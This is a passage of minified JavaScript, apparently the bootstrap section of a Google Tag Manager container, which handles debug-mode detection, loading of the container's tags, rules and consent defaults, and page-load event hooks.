  TI.dataLayer = Pi;
  TI.callback = function (a) {
    Fi.hasOwnProperty(a) && Ea(Fi[a]) && Fi[a]();
    delete Fi[a];
  };
  TI.bootstrap = 0;
  TI._spx = !1;
  function UI() {
    oi[tk()] = oi[tk()] || TI;
    zk();
    Ek() || l(Fk(), function (a, b) {
      Tu(a, b.transportUrl, b.context);
      O(92);
    });
    Xa(Gi, Z.m);
    S(67) && vk(Ck());
    vf = Lf;
  }
  (function (a) {
    function b() {
      m = E.documentElement.getAttribute("data-tag-assistant-present");
      Ux(m) && (k = g.Fk);
    }
    if (!z["__TAGGY_INSTALLED"]) {
      var c = !1;
      if (E.referrer) {
        var d = Hn(E.referrer);
        c = "cct.google" === En(d, "host");
      }
      if (!c) {
        var e = Em("googTaggyReferrer");
        c = e.length && e[0].length;
      }
      c && (z["__TAGGY_INSTALLED"] = !0, Kc("https://cct.google/taggy/agent.js"));
    }
    if (Ai) a();else {
      var f = function (u) {
          var v = "GTM",
            w = "GTM";
          ui ? (v = "OGT", w = "GTAG") : Ai && (w = v = "OPT");
          var x = z["google.tagmanager.debugui2.queue"];
          x || (x = [], z["google.tagmanager.debugui2.queue"] = x, Kc("https://" + ni.yd + "/debug/bootstrap?id=" + Tf.ctid + "&src=" + w + "&cond=" + u + "&gtm=" + hn()));
          var y = {
            messageType: "CONTAINER_STARTING",
            data: {
              scriptSource: Ec,
              containerProduct: v,
              debug: !1,
              id: Tf.ctid,
              targetRef: {
                ctid: Tf.ctid,
                isDestination: lk.ke
              },
              aliases: nk(),
              destinations: qk()
            }
          };
          y.data.resume = function () {
            a();
          };
          ni.ek && (y.data.initialPublish = !0);
          x.push(y);
        },
        g = {
          un: 1,
          Gk: 2,
          Sk: 3,
          gk: 4,
          Fk: 5
        },
        k = void 0,
        m = void 0,
        n = Fn(z.location, "query", !1, void 0, "gtm_debug");
      Ux(n) && (k = g.Gk);
      if (!k && E.referrer) {
        var p = Hn(E.referrer);
        "tagassistant.google.com" === En(p, "host") && (k = g.Sk);
      }
      if (!k) {
        var q = Em("__TAG_ASSISTANT");
        q.length && q[0].length && (k = g.gk);
      }
      k || b();
      if (!k && Vx(m)) {
        var r = function () {
            if (t) return !0;
            t = !0;
            b();
            k && Ec ? f(k) : a();
          },
          t = !1;
        Oc(E, "TADebugSignal", function () {
          r();
        }, !1);
        z.setTimeout(function () {
          r();
        }, 200);
      } else k && Ec ? f(k) : a();
    }
  })(function () {
    try {
      xk();
      if (S(24)) {}
      vj().C();
      fm();
      var a = uk();
      if (ik().canonical[a]) {
        var b = oi.zones;
        b && b.unregisterChild(pk());
      } else {
        (S(7) || S(8) || S(19) || S(16)) && wn();
        Qu();
        for (var c = data.resource || {}, d = c.macros || [], e = 0; e < d.length; e++) lf.push(d[e]);
        for (var f = c.tags || [], g = 0; g < f.length; g++) of.push(f[g]);
        for (var k = c.predicates || [], m = 0; m < k.length; m++) nf.push(k[m]);
        for (var n = c.rules || [], p = 0; p < n.length; p++) {
          for (var q = n[p], r = {}, t = 0; t < q.length; t++) {
            var u = q[t][0];
            r[u] = Array.prototype.slice.call(q[t], 1);
            "if" !== u && "unless" !== u || uf(r[u]);
          }
          mf.push(r);
        }
        qf = Z;
        rf = Lz;
        Nf = new Wf();
        var v = data.sandboxed_scripts,
          w = data.security_groups,
          x = data.infra;
        a: {
          var y = data.runtime || [],
            A = data.runtime_lines;
          Rz = new Ie();
          sH();
          kf = Qz();
          var C = Rz,
            D = rH(),
            F = new ed("require", D);
          F.Cb();
          C.h.h.set("require", F);
          for (var H = [], G = 0; G < y.length; G++) {
            var I = y[G];
            if (!Ha(I) || 3 > I.length) {
              if (0 === I.length) continue;
              break a;
            }
            A && A[G] && A[G].length && Ef(I, A[G]);
            try {
              Rz.execute(I), S(44) && Ok && 50 === I[0] && H.push(I[1]);
            } catch (Vg) {}
          }
          S(44) && (wf = H);
        }
        if (void 0 !== v) for (var P = ["sandboxedScripts"], U = 0; U < v.length; U++) {
          var ia = v[U].replace(/^_*/, "");
          Gi[ia] = P;
        }
        tH(w);
        if (void 0 !== x) for (var X = 0; X < x.length; X++) Hi[x[X]] = !0;
        UI();
        if (S(35) && !Ai) {
          for (var T = lj["7"], ma = T ? T.split("|") : [], fa = {}, ca = 0; ca < ma.length; ca++) fa[ma[ca]] = !0;
          for (var Ia = 0; Ia < Uj.length; Ia++) {
            var wa = Uj[Ia],
              Fa = fa[wa] ? "granted" : "denied";
            Cj().implicit(wa, Fa);
          }
        }
        Tx();
        Uu = !1;
        Vu = 0;
        if ("interactive" == E.readyState && !E.createEventObject || "complete" == E.readyState) Xu();else {
          Oc(E, "DOMContentLoaded", Xu);
          Oc(E, "readystatechange", Xu);
          if (E.createEventObject && E.documentElement.doScroll) {
            var Qa = !0;
            try {
              Qa = !z.frameElement;
            } catch (Vg) {}
            Qa && Yu();
          }
          Oc(z, "load", Xu);
        }
        hx = !1;
        "complete" === E.readyState ? jx() : Oc(z, "load", jx);
        Ok && (Jk(al), z.setInterval($k, 864E5));
        Jk(Nz);
        Jk(xv);
        Jk(ot);
        Jk(cq);
        Jk(Iv);
        Jk(Tp);
        Jk(kn);
        Jk(Rp);
        Jk(Ev);
        S(44) && Jk(Av);
        py();
        kj(1);
        Ew();
        Ei = Ua();
        TI.bootstrap = Ei;
        TI._spx = !0, Rx();
        if (S(24)) {}
      }
    } catch (Vg) {
      if (kj(4), Ok) {
        var Xd = Vk(!0, !0);
        Nc(Xd);
      }
    }
  });
})();